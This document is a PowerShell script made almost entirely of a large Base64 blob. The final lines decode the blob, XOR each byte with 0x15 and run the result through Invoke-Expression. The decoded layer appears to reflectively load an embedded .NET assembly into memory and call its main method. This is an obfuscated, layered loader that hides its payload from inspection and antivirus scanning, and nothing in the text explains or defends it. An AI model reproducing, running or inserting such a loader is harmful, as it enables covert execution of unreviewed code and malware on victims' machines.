VExEV2xUXVRUQFRXbFRSflR3clclVFAhVHREV3tUUnJUcVRXYVRSUFR2cld5VFYhVE9EVyFUUkBU
XFRUe1RTYlRNVFRtVFF+VFhyVGBUUVBUW3JUIVRWIVRYRFRgVFFcVFhEVCRUU2JUdmJXYVRSXFRN
VFd9VFJEVE9UV1FUXUBUTHJXeVRWIVRPVFdmVFJiVF9iVHJUVnZUTVRXdlRRUFRaRFRsVFYhVFhE
VCdUUXJUWXJUbVRWIVRYclRiVFZ2VFRGdmFUU1xUT0RXYVRSLVRxVFd5VFZUVHFEV29UUn5Ud3JX
e1RWVFR2clckVFIhVExEV29UVFJUJkZUVFlyV3ZUU1hUdFRXfVRdXFR2VFdEVF1cVHREV2BUXURU
QXJXZVRSdlR0VFclVFIlVExEV2xUUkBUWXJXeVRdclRPRFRyVFZ2VE1UV3ZUUVBUWkRUbFRWIVRY
RFQnVFFyVFlyVG1UViFUWHJUbVRRQFRNVFdvVFIlVExyV3ZUUlBUT1RXflRQWFRxRFd8VFJAVFly
V35UUmJUd1RUe1RWVFRfYld2VFNiVFhEVCBUUVxUWXJUbVRRTFRaVFRgVFFQVFlyVGxUUVRUX2JU
clRSclRMRFd/VFJmVHREVyVUViFUd1RXY1RSWFRMRFdmVFZUVE9UV2NUUiVUTERXZVRSIVRNYlck
VF1YVE9EV2xUVlRUQFRXfVRdWFR2YlRtVFFcVFhiVFdcJGJURERXYVRSRFRbclQlVFNiVENEV1pU
UH5UR1RXRlRTTFRZcldQVFBiVEFUVFREQ2ZUWURXcVRWVFRAYldiVFJAVExiV2VUUkxUcERUclRd
VFRHVFdsVFJ+VHFyV3lUXVxUQFRXfVRdRFR0VFRyVFIlVExEV2BUXUBUTERXZlRSYlRwRFRXXUJM
VHREV2ZUUkBUdnJXeVRdVFR3YldvVFJ+VHFUV2NUXVxUcERUVFxDZlRZRFdxVFZUVHZUV1BUXVxU
dERXJ1RSQFR2cldEVFJQVHFUV3pUVlRUVE0lZlRWVFRPRFchVF1UVE9EV39UXURUT0RXflRWVFRa
cld2VFN2VHREV2BUUkRUd2JXJlRdWFRNVFdBVF1+VHZiVyVUUkBUd0RUb1RRXFRNVFdQVF1cVHRE
VydUUkBUdnJXQVRdRFR3YldsVFJAVE1UV1JUUn5Ud1RXeVRTXFRPRFdiVFItVHZiV2VUXURUd2JX
bFRdflRNVFRgVFYhVFlyVGBUViFUVFZTd1RWelRNRFRyVF1UVEdUV2xUUn5UcXJXeVRdXFRAVFd9
VF1EVHRUVHJUVFRxQmJUZFRTJVRcVFdTVF1yVE9EV39UXUBUcVRXZVRSIVRPYlRyVFRUT0JiVGRU
UyVUXFRXQFRdXFRwRFRyVFFQVFlyVGBUViFUVFd5d1RWelRNRFRyVFNEVHZyVyBUVlRUWHJUYFRW
IVRZclRUUkNmVF5yV3FUVlRUQ1RXbFRdflRcVFRvVFYhVFlyVGBUVFQ6RGJUI1RTYlRDYldlVFIh
VE9UV2NUXXZUdmJXdlRTWFRwRFdvVF1EVE9EV2FUUVhUWHJXdlRddlR0RFdgVFJyVHFUVyVUXVRU
WXJXflRSYlR3VFRUUyR2VHREV2BUUkRUd2JXJlRdWFRcVFchVFFMVFtUVFRWb1BUWHJUb1RRRFRb
RFRUUiRmVF5yV3FUVlRUQGJXJVRSUFRPYld5VFZUVFhUVCNUVlRUVFBDUVRRelRNVFdNVFJ+VHdy
V35UUi1UcWJXb1RTYlRAYlcgVF1YVHFUV3lUUiVUWGJUbFRTYlR0Yld5VF1cVHdyV3lUUmJUTHJX
fVRdWFRPRFRgVFJEVHdUV2ZUVFd7RGJUI1RTYlRDYldlVFIhVE9UV2NUXXZUdmJXdlRTWFRwRFdv
VF1EVE9EV2FUUVhUWHJXdlRdWFR2VFdjVFItVHdUV3ZUUkRUdnJXZVRdTFRPRFdsVF1YVE1UVyFU
UUxUW1RXdlRRWFRNVFdjVFJiVE9UV3ZUXWZUWFRXLFRTYlRwYlRtVF0lVFRXLHdUVnpUTURUclRT
WFRxVFd9VFJ2VE9EVHJUXWZUWFRXLFRRelRcVFRUXiRmVF5iV3FUVlRUR0RXIVRdVFR3VFdjVFJ+
VHFUVHJUUFhUd2JXYVRdVFR3VFd5VF1EVE9EV35UVFZUYiRYVEFiV1JUU0RUQ2JXV1RTXFRHRFd2
VFAlVHREV39UXVxUd2JXb1RSLVRPclclVFNiVENiV2VUUiFUT1RXY1RddlR2YlRyVFAhVENUV3ZU
UFhUcURXbFRdXFRPRFdgVF1EVENyV3lUXVxUdmJXZVRSLVR3cld2VFNUVHZyV2VUUiFUcVRXdlRT
VFRMRFd/VFJmVExEV3tUUkBURkRXYFRdWFRxVFd9VFJiVHdUV31UXURUdERXY1RSIVRNVFdNVFJ+
VHdyV35UUi1UcWJXb1RWVFRwVFQnVFFEVE1UV1BUXVxUdERXJ1RSQFR2cldEVFJQVExiV2dUUlBU
T2JXeVRdWFRUVFt2VFRUc0dUV2xUUn5UcXJXeVRdXFRAYlclVFItVHZyV3lUU1RUTERXJVRSclRU
UCx3VFYlVE1EVHJUUExUTERXZVRSYlRPRFd+VFZUVHFUV2NUVlRUT0RXYFRdQFR3RFd5VF1cVExE
VyVUUkBUXFRXYlRdXFR0RFdgVF1EVE9EV2xUVlRUT1RXbFRSflRxcld5VF1cVHZiVFdYJUBUd3JX
JFRSJVRAVFdsVFJ+VHdyVyVUUkBUdnJXb1RWVFR2Yld6VFItVHFEV2ZUUkRUXFRXeFRSUFR0RFdm
VFZQVFRcVk9EYldjVF1AVHdUV35UVlRUd3JXY1RdRFRcVFdlVFIlVHZUV3lUXVxUdmJXY1RSIVRM
RFclVFJAVFxUVyVUUnJUT0RUclRSQFR3VFd5VF1MVExEVyVUUkBUT1RUclRdQFR2Yld5VF1cVFly
VHJUVlRUQVRXY1RSdlR3YldgVFNAVHZiV3lUXVxUXFRXbFRSQFRxVFckVF1cVHdyV3lUUkRUXFRX
eVRdXFR2cldjVF1cVFxUV39UUi1UT1RXeVRWVFRwYlRiVF0lVFlyVFRcJyFUcVRXYlRdXFR0RFdg
VF1EVFlyV2VUUiFUT3JXc1RSUFR3RFd+VFFMVFtUVFRUV2BMQlhUJ3F3ZVNyYXZAXV5aQ2RgclRX
VlRXVERyUVxUVFdXRlRXVEdQR1dWVFdURCFQXFRQV1RyQHJURFBHR0R2clRyUEdCR1NxVGJ2V1JU
XFJSVEBUVFdeVHlEWFRUVHJRXFRUWldEVFZRciFaU1R2WFFyIVpRciFaUX1cQF1HUHJdR1ByVldQ
cldEVFZUciFaV1RUV1REIVNTR19tVEQhU1xUUEFUVHJQVFRQWlFyRFRURFxaV1ZUV1RyIVJUVFha
UXIhWlZidlxQRlRaVkdyXFZXclxXVFRXVldiUFRUUExWVExUVGJQdlJUXFBUVFBXUlRMVFRiIVpd
V2JTVFRcWlF9YkdXYkxaU0dfbVREIUZxR0BGcERQWlFyIVNcVFBaXURYXFRUXEZxR1JUYUQhU1xU
UEZxRCFQXFRUcVFydkNQelZfVHIhVldGVFZUR2JMUkdUV1R9QEZyWSVXXXJUQ1B6VixURyFUU0de
VHxEXHBUVFxRVnJQWld9QEZyWSVXUXJyclRXQEZwRFBBVFRAQ1B7fldRckRyVFdYVFdWVFddVCFT
XFRQV1BiVFFcVFRWUXJ2X1ZEflxSVyVHXFR6RnNEclxUbFRUVnJ2VFRHXyxQTFFTV0RUV1ZXXyxX
VlRXVER6UlRUXHZSV18sVGJ2V1ZUWHJUV3JTVFRQRkBHclxhJmV2Q31+JSFcflBWRFRUVFREVlRU
VFRXVFhUVFRUUFdUVFRUVERTVFRUVFdUdlRUVFRQVlRUVFRURFRUVFRUV1RQVFRUVlR5RiFXcyRb
IHYmR3l3RiBBT0JbJHZ4eSVwRiBET01fYXRNW290QixgdmwgRE9NX2F0TVtvdEIsYEAnQyVETUcl
dnh5fHFNR3lZVldhdidbY3Z4bWVMfGJyQ3hDbHYneWN3fyUlWX9UYFhWIWJZVldRcUJtJXFNX3lF
QiB5cU1HbExCYmZcU1ckTHhtZUwlYXlwQ0djdCdDYEVCXCZbJ1AkTG9AJ1hBfm9bUkBiWlF+RlRD
RFpXUCB9d0JAX0d7Q2Z3U0dscU1bJVRHTFdUclxSVkRYUlB8clFXfV9HVHJMXFRiTEdSVFhSUEdi
VldyIVFXfVx+VlRMQ1B6Vl9UciFWV1RUV1R9clFUVFRWUVRUUlRyIVpRfVBMUEdiRFJUclRXVFxa
UXIhR1JUWFRUVH5dVFREVlFyfkxWRGJUV2JcWlFyfkxWR1RfUFR+U1RUUFddRCFSVFRYV1FyIVpW
VFRXU0dfbVREIVpXRFRUXUdQclRiVFRURExyVGJQWlFyIVlUVExWUXIhWlZUckRQfHJcVERUXFRU
VFRUVFRwVERUV1RTRFZTeXFsTE1XWncnIFNwUlt5dl1HZXcnIEB0XV9jcSZYV1ZUUFRUclRUVFRU
VFJUUFRQJFt6TE1fYkBdX2V3e0dadEJxenFSJH12eEBUVFRiV1RUcVFxQl95WF1yYlRUVE1URFRG
RCcsYnBNX2VPJ30lXFheZVxWVGxYUVxtVFRUU1REVFRUVFRlVERUfltCT3lMf1BtW1JcYVtReXlM
bCUlW39AbFlCXGxaQkBhWlJbfFtCQCZbQV95TG9beVRUVFhURFRdWEYhYll/VGBYVFRURkRQVFJ8
IFpHQ0dSdnhTYU9NcWN2eGZmQ3hDbHYneWN3fyQnW1YhJFREV0BRfUdSdnhTYU9NcWN2eGFQdE1b
YndSUyBBeFNhT0dcYEF+Q0BcUE9sTEIkeXEnLGx0bFQlWX9AWFREVFFUVFRUVHJUVFRUVFRUVFRU
VFRUVCNiZmx4clRUVFRUVlRUVFRnVFRUVFJHXFRUV35eclRUVFRUVFRUVFRUVFRUVFRUVFBUVFRU
VFRUVFRUVFRUVFRUVFRUVFNfQUdTWEFddFR2XHp9IERlUGIlViYleUZfJVREVFRUUFgjTVNDb09N
X29NU1hvTCZDbFgkR3pYTVtBdFFTJU1QR2NxJyBmdydTfnYkbVFDfkBhWH9UbFhGJW1bf3YkWUIk
fXRCIHZEJE9TWUFcYlh/UGFYQUwmW0YkYUxCeWBNU1t6TE1fYkBdX2V3e0dadEJxenFSJH12eEN2
QCd9fXZ7V0R2eHlgcVAgZU8nfSV3QlNsT0NtY0x4ZXZAeENmT0JTb09DbUF0UlNsdlNXbHRCICVB
eHl7dF1HYUxNX3lZe1d+THJUIUZEVFRUVFRUVFRUVFRUV0ZGRFRUVFZUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRHUH5UVFRUVFRUVFRUVFRUVFRXc0QnLGxHTX15QUJTZXdyV2F2J1tjdnhD
eVl4R2Z3VFRUVFRUVDpsQFRcUFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUXFRQVFRUVFZUVFRcVExUVFRUQFRUVHJUVFRUVFRUVFRUVFRUVFRUVFRU
VERUV1RUVFRaVFRUclRUVFRUVFRUVFRUVFRUVFRUVFRURFRUVFRUVHJUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFREVFdUVFRUdFRUVHJUVFRUVFRUVFRUVFRUVFRUVFRUVERUVFRUVFRcVERUVF9XclRU
VkRUYlRUVFRUVFRUVFRUVFZEVG9EVFRUV0JUU1hUTWJXQlRQQFRAcldBVFB+VEFiV1pUUy1URkRX
WlRQTFRBYlRUVFRUVGNEQWM6clRUVERUVFRUUFRUVFRUVFRUVFREVFRUVFRURWJUVFRUVFRUVFRQ
VFRUVFREVFRUVFRUVFRUVFRUVFRUVFRUVFBEVFRUVFdUU0xUTERXbFRQTFR0RFdmVFJAVEZEV2BU
UkxUd2JUVFRUVFRfVFRQVFRUVENUV2xUUlBUd3JXb1RSYlRMRFclVFJ+VHdiV2BUVFRUVFRUVFRZ
VFAtVFxUVFRQVEBiVyVUXVxUdERXYFRSdlRHcldlVFJiVE9EV19UUiFUT3JXY1RUVFRvVFxUVFRQ
VFhUVGJUUVRUWFRUYlRRRFRMclRiVFRUVF5UVFxUVFBURGJXY1RSJVR3RFd5VFIhVHFUV29UVFRU
RGJXJFRSXFRPRFRiVF1yVFhUVFRUUVRUVlRUV1RQWFR3YldhVF1UVExEV2BUXX5UQXJXfVRSJVRP
RFRUVFRUVERiVyRUUlxUT0RUYlRdclRYVFRUVFNUVFNUVFdUUExUdERXZlRSQFRHVFd5VF1YVExi
V2xUUn5UdlRXJVRSflR3YldgVFRUVFRUV0FUUnJUTERXbFRdVFRAVFdsVFJ+VHdyVyVUUCFUdERX
e1RSclRxVFdhVFJQVHZyV3lUVFRUWFRUXFRUUFRHcldlVFJiVE9EV0JUUkBUdnJXb1RSflR3Yldg
VFRUVFRUVG1UViFUWFRUYFRRVFRZclRiVFRUVEBUVExUVFBURkRXYFRdRFRPRFdsVFIhVExEV2ZU
UCFUTERXYVRSQFRUVFdBVFJyVExEV2xUXVRUQFRXbFRSflR3clclVFAhVHREV3tUUnJUcVRXYVRS
UFR2cld5VFYhVE9EVyFUUkBUVFRXXFRXXFRURFdYVFJAVE9iV31UUmJURGJXY1RdVFRwRFdsVFJ+
VE9iV3pUXURUVFRXUVRSLVR2VFcgVF1cVHREV3tUUnJUcVRUclReflRcVFRyVFFcVFhUVGxUUVBU
VFRUIVRUclRURFdYVFJAVE9iV31UUmJUQ1RXbFRSUFRPVFd5VFIlVExEV2xUUmZUdmJUVFRUVFRE
YlckVFJcVE9EVGJUXXJUWFRUVFRTclRSVFRXVFAtVHZyV2VUUnZUdERXYFRSUFR3VFdSVFJ+VHdU
V3lUUiFUTERXYVRSQFRUVFdBVFJyVExEV2xUXVRUQFRXbFRSflR3clclVFAhVHREV3tUUnJUcVRX
YVRSUFR2cld5VFYhVE9EVyFUUkBUVFRXXFRXRFRURFdEVF1cVHdiV35UXUBUTGJXJVRQIVRMRFdh
VFJAVFRUVFRUU1hUdFRXfVRdXFR2VFdEVF1cVHREV2BUXURUQXJXZVRSdlR0VFclVFIlVExEV2xU
UkBUVFRUJVRUclRURFdEVF1cVHdiV35UXUBUTGJXJVRTTFRPRFdsVF1YVHREV2NUUiFUVFRUbVRW
IVRYVFRgVFFUVFlyVGJUVFRUWlRUXFRUUFRERFdvVF1YVE9EV2FUUlxUd1RXIFRWVFRDcld5VF1c
VHZiV2VUUi1Ud3JUVFRRUFRZclRiVFYhVFhUVGBUUVRUVFRUYk9UVFQjclBUVFRUVFRUVFRUVFRU
IiJgOkVRLCF3QmJycXhDbHYneWN3fyV8WEYhYlx8V3l3eFtjT1J5YE9vJXxDQ0dSWUFyfFxdWyVM
QiB+TEJtY3d4QCxce3l5dmxcOkVyJV5RRHotTE1bb09CJHx3XX5ycFIkZnd7WCxce0Nsd39lb0wn
fXl3QlNvWUIkZUwmX2N2Jyx4cVYkf3cnJSNMTVthWXtMbVx8V2FMQiBlT3hDb3FTT3l2e1tldych
LFx/UGBYVlw+UUR6clxRbX12Jlt5d0JfZnBAeX5PQiAldE1HIFxdT3l2e1tldychLFx/UGBYViFi
WX9UfFxSIH13QkAsXH4kIERNV2J3Unl/TE1HZXcnIWBMTVdiXHwtPlFEenJcUW0ldntDb3FQeWBP
eC1ycFIkZnd7WCxce0Nsd39lb0wnfXl3QlNvWUIkZUwmX2N2Jyx4cVYkf3cnJSNMTVthWXtMbFx/
IVtWfFRyXFZULXYnQ39xTV9lcV1+PlFEenJcVlRyXFZULXZ4Q21xQkNvcVJDfkBdX2VxeHlmT0Jx
eXZsVyF3Qm1gdm8lfHFNX2Bae1t/dFJDYUxNWGF3Qnl/dngsb3cnTyVZQltjd0FlfXYnJWBxf1h8
RXIlXlxWVHJcVlRyXFZULXZ4Q21xQkNvcVJDfkdNfXlMJkMldEIsYEFSQydPQmJyd1JDJ09CYixc
eFNvRkIgJ3cnYXl2fFxycUJ5V0wnW3l2JlgsXHhPfXddW3lcfC0+UUR6clxWVHJcVlQtWSZfeXZN
Q3l2Jkd5T1NXbHRNT2V3UkN7T01YPlFEenJcVlRyRVYsb09CWyR2eHklcEEhW1Z8VHJFViwldntD
b3FQeWBPeC0+UUR6LVknU292J0NhTHhtIEVyVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUV1RUVFRYVFRU
VE9RflRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVDcfNTU1NTFHVEY1
KDVORmxmYXB4O0dwc3lwdmF8ens7VGZmcHh3eWxILy9ZenRxPU5WentjcGdhSC8vU2d6eFd0ZnAj
IUZhZ3x7cj0xd3RmcCMhd3x7dGdsPDwfNTU1NU5GfXRnZUVnfHthW3xyfWF4dGdwO0VnenJndHhI
Ly94dHx7PTFWenh4dHtxO0ZleXxhPTc1Nzw8HzU1H2gf"

$file = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($EncodedText))
$data = $enc.GetBytes($file)|%{$_-bXor0x15}
iex ([System.Text.Encoding]::ASCII.GetString($data))

